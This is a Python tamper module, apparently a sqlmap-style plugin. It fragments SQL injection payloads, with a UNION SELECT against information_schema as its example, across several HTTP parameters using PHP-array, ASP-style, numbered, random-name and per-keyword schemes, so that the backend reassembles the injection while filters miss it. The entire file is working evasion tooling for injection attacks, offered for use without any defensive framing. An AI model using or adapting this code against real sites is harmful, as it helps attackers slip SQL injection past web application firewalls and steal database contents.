import random
import re

__example_payload__ = "' UNION SELECT NULL,NULL FROM information_schema.tables--"
__type__ = "parameter fragmentation: splits SQL payload across multiple named parameters for backend reassembly"


def tamper(payload, **kwargs):
    if not payload:
        return payload

    # Strategy bank for different backends
    strategies = [
        # PHP: param[] concatenation
        lambda s: _fragment_with_prefix(s, _random_param_name(True)),
        # ASP: param(1), param(2) style
        lambda s: _fragment_asp_style(s),
        # Generic: numbered params q1, q2, q3
        lambda s: _fragment_numbered(s),
        # Mixed: random param names + original
        lambda s: _fragment_random_params(s),
        # Token-based: each SQL keyword becomes its own param
        lambda s: _fragment_by_keyword(s),
    ]

    strategy = random.choice(strategies)
    return strategy(payload)


def _random_param_name(array_style=False):
    names = ["q", "id", "s", "search", "query", "p", "keyword", "term", "val", "data"]
    name = random.choice(names)
    return "{}[]".format(name) if array_style else name


def _fragment_with_prefix(payload, prefix):
    """Split into 2-4 fragments with same param prefix"""
    n = random.randint(2, 4)
    chunk_size = max(2, len(payload) // n)
    chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
    if len(chunks) < 2:
        return payload
    return "&".join("{}={}".format(prefix, c) for c in chunks)


def _fragment_asp_style(payload):
    """ASP-style: param(1), param(2)"""
    n = random.randint(2, 3)
    chunk_size = max(2, len(payload) // n)
    chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
    if len(chunks) < 2:
        return payload
    name = _random_param_name(False)
    return "&".join("{}({})={}".format(name, i + 1, c) for i, c in enumerate(chunks))


def _fragment_numbered(payload):
    """Numbered params: q1, q2, q3"""
    n = random.randint(2, 3)
    chunk_size = max(2, len(payload) // n)
    chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
    if len(chunks) < 2:
        return payload
    return "&".join("q{}={}".format(i + 1, c) for i, c in enumerate(chunks))


def _fragment_random_params(payload):
    """Random parameter names for each fragment"""
    n = random.randint(2, 3)
    chunk_size = max(2, len(payload) // n)
    chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
    if len(chunks) < 2:
        return payload
    params = ["q", "id", "s", "p", "search", "x", "y", "z", "t", "w"]
    chosen = random.sample(params, len(chunks))
    return "&".join("{}={}".format(chosen[i], c) for i, c in enumerate(chunks))


def _fragment_by_keyword(payload):
    """Split payload by SQL keywords, each becomes its own parameter"""
    keywords = r'(UNION|SELECT|FROM|WHERE|AND|OR|ORDER\s+BY|GROUP\s+BY|NULL|SLEEP|WAITFOR)'
    parts = re.split(keywords, payload, flags=re.IGNORECASE)
    parts = [p for p in parts if p and p.strip()]
    if len(parts) < 2:
        return payload
    params = ["q", "p", "s", "x", "y", "z"]
    chosen = random.sample(params, min(len(parts), len(params)))
    retval = ""
    for i, part in enumerate(parts):
        if i == 0:
            retval = part
        else:
            retval += "&{}={}".format(chosen[i % len(chosen)], part.strip())
    return retval
